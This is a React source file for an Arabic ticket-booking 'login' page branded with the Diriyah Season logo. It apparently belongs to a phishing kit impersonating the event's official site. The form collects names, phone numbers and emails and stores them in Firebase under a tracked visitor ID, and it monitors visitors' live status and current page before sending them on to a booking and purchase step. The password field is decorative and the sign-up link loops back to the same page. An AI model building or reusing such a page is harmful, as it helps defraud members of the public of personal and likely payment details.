import { useLocation } from "wouter";
import { useState, useEffect, useRef } from "react";
import { motion } from "framer-motion";
import { addData, getOrCreateVisitorId, handleCurrentPage } from "@/lib/firebase";
import { setupOnlineStatus } from "@/lib/utils";
import { Menu, X } from "lucide-react";

const LOGO_URL =
 "https://upload.wikimedia.org/wikipedia/commons/5/57/%D8%B4%D8%B9%D8%A7%D8%B1_%D9%85%D9%88%D8%B3%D9%85_%D8%A7%D9%84%D8%AF%D8%B1%D8%B9%D9%8A%D8%A9.png?utm_source=ar.wikipedia.org&utm_campaign=index&utm_content=original";

const TERRACOTTA = "#A85734";
const BG_CREAM = "#F7F1EC";

export default function RegistrationPage() {
  useEffect(() => {
    void handleCurrentPage("registration");
  }, []);

  return (
    <div
      className="min-h-screen flex flex-col text-right font-sans"
      style={{ backgroundColor: BG_CREAM }}
      dir="rtl"
      data-testid="page-registration"
    >
      <Header />
      <HeroBanner />
      
      <main className="flex-1 max-w-lg w-full mx-auto px-4 sm:px-6 py-8 sm:py-10">
        <RegistrationForm />
      </main>

      <Footer />
    </div>
  );
}

function Header() {
  const [open, setOpen] = useState(false);
  const [, setLocation] = useLocation();

  return (
    <>
      <header className="sticky top-0 z-40 flex justify-between items-center px-5 sm:px-6 py-4 bg-[#F7F1EC]/95 backdrop-blur-xl border-b border-[#C98A68]/30 shadow-[0_4px_18px_rgba(90,54,39,0.05)]">
        <button
          onClick={() => setOpen(!open)}
          className="text-gray-800 p-1 cursor-pointer"
          data-testid="button-menu"
          aria-label="القائمة"
        >
          {open ? <X className="w-7 h-7" /> : <Menu className="w-7 h-7" />}
        </button>

        <div className="flex items-center gap-3">
          <div className="border border-[#A85734] p-1 rounded">
            <img
              src={LOGO_URL}
              alt="الدرعية"
              className="h-10 object-contain"
            />
          </div>
        </div>
      </header>

      {open && (
        <nav
          className="fixed top-[70px] left-0 right-0 z-50 bg-black/90 backdrop-blur px-6 py-6 space-y-3"
          data-testid="nav-mobile-menu"
        >
          {[
            { href: "/", label: "الرئيسية" },
            { href: "/registration", label: "تسجيل الدخول" },
            { href: "/booking", label: "خيارات الحجز" },
          ].map((it) => (
            <a
              key={it.href}
              href={it.href}
              onClick={() => {
                setOpen(false);
                setLocation(it.href);
              }}
              className="block text-white text-lg py-2 border-b border-white/10 last:border-b-0 text-right cursor-pointer"
            >
              {it.label}
            </a>
          ))}
        </nav>
      )}
    </>
  );
}

function HeroBanner() {
  return (
    <div className="w-full">
      {/* Title Bar */}
      <div
        className="py-7 sm:py-8 text-center text-white text-2xl sm:text-3xl font-bold shadow-[inset_0_-1px_0_rgba(255,255,255,0.12)]"
        style={{ backgroundColor: TERRACOTTA }}
      >
        تسجيل الدخول
      </div>

      {/* Progress Bar */}
      <div
        className="py-5 px-8 flex flex-col items-center justify-center text-white"
        style={{ backgroundColor: "#A85734" }}
      >
        <div className="relative w-full max-w-xs flex items-center justify-between">
          {/* Background Track */}
          <div className="absolute top-1/2 left-0 right-0 -translate-y-1/2 h-[2px] bg-white/40 z-0" />

          {/* Steps */}
          <div className="relative z-10 flex flex-col items-center">
            <div className="w-3.5 h-3.5 rounded-full bg-white ring-4 ring-white/20 mb-1.5" />
            <span className="text-[11px] font-medium opacity-90">تسجيل</span>
          </div>

          <div className="relative z-10 flex flex-col items-center">
            <div className="w-3 h-3 rounded-full bg-white/60 mb-1.5" />
            <span className="text-[11px] font-medium opacity-75">اختيار التذاكر</span>
          </div>

          <div className="relative z-10 flex flex-col items-center">
            <div className="w-3 h-3 rounded-full bg-white/60 mb-1.5" />
            <span className="text-[11px] font-medium opacity-75">إتمام الشراء</span>
          </div>
        </div>
      </div>
    </div>
  );
}

function RegistrationForm() {
  const [, setLocation] = useLocation();
  const [name, setName] = useState("");
  const [phone, setPhone] = useState("");
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [honeypot, setHoneypot] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [errors, setErrors] = useState<{
    name?: string;
    phone?: string;
    email?: string;
    password?: string;
    bot?: string;
  }>({});

  const formLoadTime = useRef(Date.now());
  const interactionCount = useRef(0);
  const hasMouseMoved = useRef(false);

  useEffect(() => {
    const handleMouseMove = () => {
      hasMouseMoved.current = true;
    };
    const handleKeyPress = () => {
      interactionCount.current++;
    };
    window.addEventListener("mousemove", handleMouseMove);
    window.addEventListener("keypress", handleKeyPress);
    return () => {
      window.removeEventListener("mousemove", handleMouseMove);
      window.removeEventListener("keypress", handleKeyPress);
    };
  }, []);

  const isBotDetected = (): boolean => {
    if (honeypot) return true;
    if (Date.now() - formLoadTime.current < 800) return true;
    return false;
  };

  const handleSubmit = async () => {
    if (isSubmitting) return;
    const newErrors: typeof errors = {};

    if (!name.trim()) newErrors.name = "الاسم الكامل مطلوب";
    if (!phone.trim()) newErrors.phone = "رقم الهاتف مطلوب";
    if (!email.trim()) newErrors.email = "البريد الإلكتروني مطلوب";
    if (!password.trim()) newErrors.password = "كلمة المرور مطلوبة";

    setErrors(newErrors);

    if (Object.keys(newErrors).length === 0) {
      setIsSubmitting(true);
      const visitorId = getOrCreateVisitorId();
      if (!visitorId) {
        setIsSubmitting(false);
        return;
      }

      await addData({
        id: visitorId,
        name,
        email,
        phone,
        currentPage: "registration",
      });
      setupOnlineStatus(visitorId);
      setLocation("/booking");
      return;
    }
    setIsSubmitting(false);
  };

  return (
    <motion.div
      initial={{ opacity: 0, y: 12 }}
      animate={{ opacity: 1, y: 0 }}
      transition={{ duration: 0.4 }}
      className="w-full"
    >
      <input
        type="text"
        value={honeypot}
        onChange={(e) => setHoneypot(e.target.value)}
        className="absolute opacity-0 pointer-events-none h-0 w-0"
        tabIndex={-1}
        autoComplete="off"
        aria-hidden="true"
      />

      {errors.bot && (
        <div className="mb-4 p-3 rounded bg-red-50 border border-red-200 text-red-600 text-xs text-center">
          {errors.bot}
        </div>
      )}

      <form
        className="space-y-5 bg-white/95 border border-[#EAD8CE] rounded-3xl p-5 sm:p-7 shadow-[0_14px_40px_rgba(90,54,39,0.09)]"
        onSubmit={(e) => {
          e.preventDefault();
          void handleSubmit();
        }}
      >
        {/* Field 1: الاسم كامل */}
        <div className="space-y-2">
          <label className="block text-sm font-medium text-gray-800 text-right">
            الاسم كامل
          </label>
          <input
            type="text"
            value={name}
            onChange={(e) => setName(e.target.value)}
            className={`w-full h-12 px-4 rounded-xl border bg-[#FCF9F7] text-gray-900 text-sm outline-none transition-all duration-200 focus:border-[#A85734] focus:ring-2 focus:ring-[#A85734]/15 ${
              errors.name ? "border-red-400" : "border-gray-300"
            }`}
            data-testid="input-name"
          />
          {errors.name && <p className="text-red-500 text-xs">{errors.name}</p>}
        </div>

        {/* Field 2: رقم الهاتف */}
        <div className="space-y-2">
          <label className="block text-sm font-medium text-gray-800 text-right">
            رقم الهاتف
          </label>
          <input
            type="tel"
            value={phone}
            onChange={(e) => setPhone(e.target.value)}
            placeholder=""
            className={`w-full h-12 px-4 rounded-xl border bg-[#FCF9F7] text-gray-900 text-sm outline-none transition-all duration-200 focus:border-[#A85734] focus:ring-2 focus:ring-[#A85734]/15 ${
              errors.phone ? "border-red-400" : "border-gray-300"
            }`}
            data-testid="input-phone"
          />
          {errors.phone && <p className="text-red-500 text-xs">{errors.phone}</p>}
        </div>

        {/* Field 3: بريد الالكتروني */}
        <div className="space-y-2">
          <label className="block text-sm font-medium text-gray-800 text-right">
            بريد الالكتروني
          </label>
          <input
            type="email"
            value={email}
            onChange={(e) => setEmail(e.target.value)}
            dir="ltr"
            className={`w-full h-12 px-4 rounded-xl border bg-[#FCF9F7] text-gray-900 text-sm outline-none transition-all duration-200 focus:border-[#A85734] focus:ring-2 focus:ring-[#A85734]/15 ${
              errors.email ? "border-red-400" : "border-gray-300"
            }`}
            style={{ textAlign: "right" }}
            data-testid="input-email"
          />
          {errors.email && <p className="text-red-500 text-xs">{errors.email}</p>}
        </div>

        {/* Field 4: كلمة المرور */}
        <div className="space-y-2">
          <label className="block text-sm font-medium text-gray-800 text-right">
            كلمة المرور
          </label>
          <input
            type="password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            className={`w-full h-12 px-4 rounded-xl border bg-[#FCF9F7] text-gray-900 text-sm outline-none transition-all duration-200 focus:border-[#A85734] focus:ring-2 focus:ring-[#A85734]/15 ${
              errors.password ? "border-red-400" : "border-gray-300"
            }`}
            data-testid="input-password"
          />
          {errors.password && <p className="text-red-500 text-xs">{errors.password}</p>}
        </div>

        {/* Submit Button */}
        <button
          type="submit"
          disabled={isSubmitting}
          className="w-full h-14 mt-4 rounded-2xl font-bold text-lg text-white transition-all duration-300 hover:-translate-y-0.5 hover:shadow-[0_14px_30px_rgba(168,87,52,0.28)] active:translate-y-0 disabled:opacity-60 disabled:cursor-not-allowed cursor-pointer shadow-[0_10px_24px_rgba(168,87,52,0.22)]"
          style={{ backgroundColor: "#A85734" }}
          data-testid="button-login"
        >
          {isSubmitting ? "جاري الدخول..." : "دخول"}
        </button>
      </form>

      {/* Bottom Link */}
      <div className="mt-8 text-center">
        <a
          href="#"
          onClick={(e) => {
            e.preventDefault();
            setLocation("/registration");
          }}
          className="text-sm text-gray-700 hover:underline font-medium"
          data-testid="link-signup"
        >
          ليس لديك حساب ؟ تسجيل حساب جديد
        </a>
      </div>
    </motion.div>
  );
}

function Footer() {
  return (
    <footer
      className="py-10 text-center text-white font-medium text-xs mt-auto"
      style={{ backgroundColor: TERRACOTTA }}
      data-testid="section-footer"
    >
      حقوق النسخ 2024. جميع الحقوق محفوظة.
    </footer>
  );
}
